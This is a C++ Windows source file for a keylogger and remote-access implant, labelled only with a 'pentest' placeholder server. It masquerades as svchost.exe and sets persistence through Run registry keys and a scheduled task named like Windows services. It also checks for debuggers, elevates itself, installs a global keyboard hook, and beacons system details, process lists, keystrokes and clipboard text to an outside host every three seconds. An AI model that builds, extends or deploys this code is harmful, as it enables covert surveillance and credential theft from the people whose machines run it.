#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0600  // Windows Vista or newer
#endif

#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#define SECURITY_WIN32           // <<-- add this before including security/sspi headers

#include <winsock2.h>
#include <ws2tcpip.h>

#include <windows.h>
#include <shellapi.h>
#include <winhttp.h>
#include <tlhelp32.h>
#include <shlobj.h>
#include <fstream>
#include <string>
#include <thread>
#include <iostream>
#include <vector>
#include <sstream>
#include <psapi.h>
#include <iphlpapi.h>
#include <wininet.h>
#include <userenv.h>
#include <wtsapi32.h>
#include "secext_byteware.h"
#include <Lmcons.h>
#include <limits> // for numeric_limits

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "wtsapi32.lib")
#pragma comment(lib, "version.lib")
#pragma comment(lib, "Secur32.lib")
#pragma comment(lib, "Ws2_32.lib")

// ADVANCED CONFIGURATION
const std::wstring SERVER_HOST = L"your-pentest-server.com";
const std::wstring SERVER_PATH = L"/advanced-stream";
const int SERVER_PORT = 443;
const std::wstring STARTUP_NAME = L"svchost.exe";  // Ultra-stealth
const std::wstring ENCRYPTION_KEY = L"MySecretKey123";  // Simple XOR key

// Global state
HHOOK g_hKeyboardHook = NULL;
std::wstring g_keyBuffer;
CRITICAL_SECTION g_csKeyBuffer;
bool g_running = true;

// XOR Encryption (simple obfuscation)
std::string XOR_encrypt(const std::string& data, const std::wstring& key) {
    std::string result = data;
    for (size_t i = 0; i < data.length(); ++i) {
        result[i] ^= static_cast<char>(key[i % key.length()]);
    }
    return result;
}

std::wstring GetStartupPath() {
    wchar_t path[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_STARTUP, NULL, 0, path))) {
        return std::wstring(path) + L"\\" + STARTUP_NAME;
    }
    return L"";
}

bool SelfElevate() {
    if (IsUserAnAdmin()) return true;

    wchar_t szPath[MAX_PATH];
    if (GetModuleFileNameW(NULL, szPath, MAX_PATH)) {
        // Build persistent parameter string (avoid dangling pointer)
        std::wstring params = L"/B \"" + std::wstring(szPath) + L"\"";
        std::wstring cmdParams = L"/C ";
        cmdParams += params;

        SHELLEXECUTEINFOW sei = { 0 };
        sei.cbSize = sizeof(sei);
        sei.lpVerb = L"runas";
        sei.lpFile = L"cmd.exe";
        sei.lpParameters = cmdParams.c_str();
        sei.nShow = SW_HIDE;
        sei.fMask = SEE_MASK_DEFAULT;
        return ShellExecuteExW(&sei) != FALSE;
    }
    return false;
}

bool InstallPersistence() {
    std::wstring startupPath = GetStartupPath(); // zakładam, że masz tę funkcję
    if (startupPath.empty()) return false;

    // Kopiowanie pliku do folderu autostartu
    if (!CopyFileW(GetCommandLineW(), startupPath.c_str(), FALSE)) {
        // można dodać obsługę błędu
        return false;
    }

    // Calculate cbData safely (check for overflow before casting)
    size_t cbDataSize = (startupPath.length() + 1) * sizeof(wchar_t);
    if (cbDataSize > static_cast<size_t>(std::numeric_limits<DWORD>::max())) {
        return false; // path is impossibly long for DWORD-based APIs
    }
    DWORD cbData = static_cast<DWORD>(cbDataSize);

    // Rejestr HKCU (dla bieżącego użytkownika)
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExW(hKey,
            L"WindowsSecurityService",
            0,
            REG_SZ,
            reinterpret_cast<const BYTE*>(startupPath.c_str()),
            cbData);
        RegCloseKey(hKey);
    }

    // Rejestr HKLM (dla wszystkich użytkowników – wymaga admina)
    if (IsUserAnAdmin()) {
        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
            L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            RegSetValueExW(hKey,
                L"WindowsSecurityService",
                0,
                REG_SZ,
                reinterpret_cast<const BYTE*>(startupPath.c_str()),
                cbData);
            RegCloseKey(hKey);
        }
    }

    // Zadanie w Harmonogramie (SYSTEM persistence)
    std::wstring cmd = L"schtasks /create /tn \"WindowsUpdateCheck\" /tr \""
        + startupPath
        + L"\" /sc onlogon /rl highest /f >nul 2>&1";

    _wsystem(cmd.c_str());

    return true;
}

std::string WideToUTF8(const std::wstring& wstr) {
    if (wstr.empty()) return {};
    int size_needed = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), (int)wstr.size(), NULL, 0, NULL, NULL);
    std::string strTo(size_needed, 0);
    WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), (int)wstr.size(), &strTo[0], size_needed, NULL, NULL);
    return strTo;
}

// Sprawdzenie, czy proces działa jako administrator
bool IsRunningAsAdmin() {
    BOOL fIsRunAsAdmin = FALSE;
    PSID pAdministratorsGroup = NULL;
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;

    if (AllocateAndInitializeSid(&NtAuthority, 2,
        SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
        0, 0, 0, 0, 0, 0, &pAdministratorsGroup)) {
        CheckTokenMembership(NULL, pAdministratorsGroup, &fIsRunAsAdmin);
        FreeSid(pAdministratorsGroup);
    }
    return fIsRunAsAdmin;
}

// Pobranie prawdziwej wersji Windows
bool GetRealWindowsVersion(DWORD& major, DWORD& minor) {
    HMODULE hMod = ::GetModuleHandleW(L"ntdll.dll");
    if (!hMod) return false;

    typedef LONG(NTAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
    RtlGetVersionPtr fxPtr = (RtlGetVersionPtr)GetProcAddress(hMod, "RtlGetVersion");
    if (!fxPtr) return false;

    RTL_OSVERSIONINFOW rovi = { 0 };
    rovi.dwOSVersionInfoSize = sizeof(rovi);
    if (fxPtr(&rovi) == 0) {
        major = rovi.dwMajorVersion;
        minor = rovi.dwMinorVersion;
        return true;
    }
    return false;
}

std::string GetSystemInfo() {
    std::ostringstream oss;

    // Architektura
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    oss << "arch:" << (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 ? "x64" : "x86");

    // OS version
    DWORD major = 0, minor = 0;
    if (GetRealWindowsVersion(major, minor)) {
        oss << "|os:" << major << "." << minor;
    }

    // Nazwa komputera
    wchar_t hostname[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = MAX_COMPUTERNAME_LENGTH + 1;
    if (GetComputerNameW(hostname, &size)) {
        oss << "|host:" << WideToUTF8(hostname);
    }

    // Nazwa użytkownika
    wchar_t username[UNLEN + 1];
    DWORD usize = UNLEN + 1;
    if (GetUserNameW(username, &usize)) {
        oss << "|user:" << WideToUTF8(username);
    }

    // Domeny
    wchar_t domain[MAX_PATH];
    DWORD dsize = MAX_PATH;
    if (GetEnvironmentVariableW(L"USERDOMAIN", domain, dsize)) {
        oss << "|domain:" << WideToUTF8(domain);
    }

    // Status admina
    oss << "|admin:" << (IsRunningAsAdmin() ? "true" : "false");

    return oss.str();
}

std::string GetNetworkInfo() {
    std::ostringstream oss;

    ULONG bufferLength = 0;
    DWORD ret = GetAdaptersAddresses(AF_INET, GAA_FLAG_INCLUDE_PREFIX, NULL, NULL, &bufferLength);
    if (ret != ERROR_BUFFER_OVERFLOW) {
        return "Error getting adapter addresses size";
    }

    PIP_ADAPTER_ADDRESSES pAddresses = (PIP_ADAPTER_ADDRESSES)malloc(bufferLength);
    if (!pAddresses) return "Memory allocation failed";

    ret = GetAdaptersAddresses(AF_INET, GAA_FLAG_INCLUDE_PREFIX, NULL, pAddresses, &bufferLength);
    if (ret != NO_ERROR) {
        free(pAddresses);
        return "Error getting adapter addresses";
    }

    for (PIP_ADAPTER_ADDRESSES pCurr = pAddresses; pCurr != NULL; pCurr = pCurr->Next) {
        for (PIP_ADAPTER_UNICAST_ADDRESS pUnicast = pCurr->FirstUnicastAddress; pUnicast != NULL; pUnicast = pUnicast->Next) {
            if (pUnicast->Address.lpSockaddr->sa_family == AF_INET) {
                char ip[INET_ADDRSTRLEN];
                sockaddr_in* sa_in = reinterpret_cast<sockaddr_in*>(pUnicast->Address.lpSockaddr);
                inet_ntop(AF_INET, &(sa_in->sin_addr), ip, INET_ADDRSTRLEN);
                oss << "ip:" << ip << ";";
            }
        }
    }

    free(pAddresses);

    // Placeholder public IP
    oss << "pubip:checking";

    return oss.str();
}

std::string GetRunningProcesses() {
    std::ostringstream oss;

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return "";
    }

    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);

    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            char buffer[260];
            WideCharToMultiByte(CP_ACP, 0, pe32.szExeFile, -1, buffer, sizeof(buffer), nullptr, nullptr);
            oss << buffer << "(" << pe32.th32ProcessID << ");";
        } while (Process32NextW(hSnapshot, &pe32));
    }

    CloseHandle(hSnapshot);
    return oss.str();
}

std::string CaptureClipboard() {
    if (!OpenClipboard(NULL)) return "no_clipboard";

    HANDLE hData = GetClipboardData(CF_TEXT);
    if (hData == NULL) {
        CloseClipboard();
        return "empty_clipboard";
    }

    char* pszText = static_cast<char*>(GlobalLock(hData));
    std::string result(pszText ? pszText : "");
    GlobalUnlock(hData);
    CloseClipboard();
    return result.length() > 100 ? result.substr(0, 100) + "..." : result;
}

void SaveFile(const std::string& filename, const std::string& content) {
    std::ofstream file("C:\\Windows\\Temp\\" + filename, std::ios::binary);
    file << content;
    file.close();
}

// Advanced Screenshot (with base64 stub)
std::string CaptureAdvancedScreenshot() {
    HDC hScreenDC = GetDC(NULL);
    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);

    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
    SelectObject(hMemoryDC, hBitmap);
    BitBlt(hMemoryDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY);

    // NOTE: removed unused BITMAPFILEHEADER / BITMAPINFOHEADER to avoid C4101 warnings.
    // ... bitmap encoding logic (simplified for space)

    std::string result = "screen_" + std::to_string(width) + "x" + std::to_string(height) + "_captured";

    DeleteDC(hMemoryDC);
    ReleaseDC(NULL, hScreenDC);
    DeleteObject(hBitmap);

    return result;
}

// LOW-LEVEL KEYBOARD HOOK
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* pKeyBoard = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
        wchar_t key = static_cast<wchar_t>(pKeyBoard->vkCode);

        EnterCriticalSection(&g_csKeyBuffer);
        g_keyBuffer += key;
        if (g_keyBuffer.length() > 1000) g_keyBuffer.clear();
        LeaveCriticalSection(&g_csKeyBuffer);
    }
    return CallNextHookEx(g_hKeyboardHook, nCode, wParam, lParam);
}

bool InstallKeyboardHook() {
    InitializeCriticalSection(&g_csKeyBuffer);
    g_hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);
    return g_hKeyboardHook != NULL;
}

std::string GetKeystrokes() {
    EnterCriticalSection(&g_csKeyBuffer);
    std::wstring keys = g_keyBuffer;
    g_keyBuffer.clear();
    LeaveCriticalSection(&g_csKeyBuffer);
    return std::string(keys.begin(), keys.end());
}

bool SendAdvancedData(const std::wstring& endpoint, const std::string& data) {
    // 1. Otwórz sesję WinHTTP
    HINTERNET hSession = WinHttpOpen(L"WindowsUpdate/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0);
    if (!hSession) return false;

    // 2. Połącz z serwerem
    HINTERNET hConnect = WinHttpConnect(hSession,
        SERVER_HOST.c_str(),
        SERVER_PORT,
        0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return false;
    }

    // 3. Otwórz żądanie POST
    HINTERNET hRequest = WinHttpOpenRequest(hConnect,
        L"POST",
        endpoint.c_str(),
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }

    // 4. Przygotuj dane POST
    std::string encrypted = XOR_encrypt(data, ENCRYPTION_KEY);
    std::string postData = "payload=" + encrypted;

    // Ensure length fits in DWORD before casting
    size_t postLenSize = postData.length();
    if (postLenSize > static_cast<size_t>(std::numeric_limits<DWORD>::max())) {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }
    DWORD postLen = static_cast<DWORD>(postLenSize);

    // 5. Dodaj nagłówki
    BOOL headersResult = WinHttpAddRequestHeaders(
        hRequest,
        L"User-Agent: Mozilla/5.0\r\nContent-Type: application/x-www-form-urlencoded\r\n",
        -1,
        WINHTTP_ADDREQ_FLAG_ADD
    );

    if (!headersResult) {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }

    // 6. Wyślij żądanie (use checked DWORD lengths)
    BOOL result = WinHttpSendRequest(
        hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS,
        0,
        (LPVOID)postData.c_str(),
        postLen,
        postLen,
        0
    );

    if (result) {
        WinHttpReceiveResponse(hRequest, NULL);
    }

    // 7. Zamknij uchwyty
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return result != FALSE;
}
void AntiAnalysis() {
    // Check for debuggers
    if (IsDebuggerPresent()) {
        ExitProcess(0);
    }

    // Use 64-bit tick counter to avoid overflow issues
    ULONGLONG start = GetTickCount64();
    Sleep(100);
    if (GetTickCount64() - start < 90) {
        ExitProcess(0);
    }
}

void StealthMode() {
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);

    // Unhook from parent process
    FreeConsole();
}

void BeaconLoop() {
    while (g_running) {
        std::ostringstream payload;

        // System fingerprint
        payload << "SYS|" << GetSystemInfo();
        payload << "|NET|" << GetNetworkInfo();
        payload << "|PROCS|" << GetRunningProcesses();

        // User activity
        payload << "|KEYS|" << GetKeystrokes();
        payload << "|CLIP|" << CaptureClipboard();
        payload << "|SCREEN|" << CaptureAdvancedScreenshot();

        // Browser data stub
        payload << "|BROWSER|Chrome_Firefox_Edge_profiles_scanned";

        SendAdvancedData(SERVER_PATH, payload.str());
        Sleep(3000);  // 3s beacon interval
    }
}

int WINAPI WinMain(
    HINSTANCE hInstance,
    HINSTANCE hPrevInstance,
    LPSTR lpCmdLine,
    int nCmdShow
) {
    // Anti-analysis first
    AntiAnalysis();

    // Stealth
    StealthMode();

    // Self-elevate if needed
    if (!IsUserAnAdmin()) SelfElevate();

    // Persistence
    InstallPersistence();

    // Hook keyboard
    InstallKeyboardHook();

    // Main beacon
    std::thread beacon(BeaconLoop);
    beacon.detach();

    // Keep alive
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(g_hKeyboardHook);
    DeleteCriticalSection(&g_csKeyBuffer);
    return 0;
}
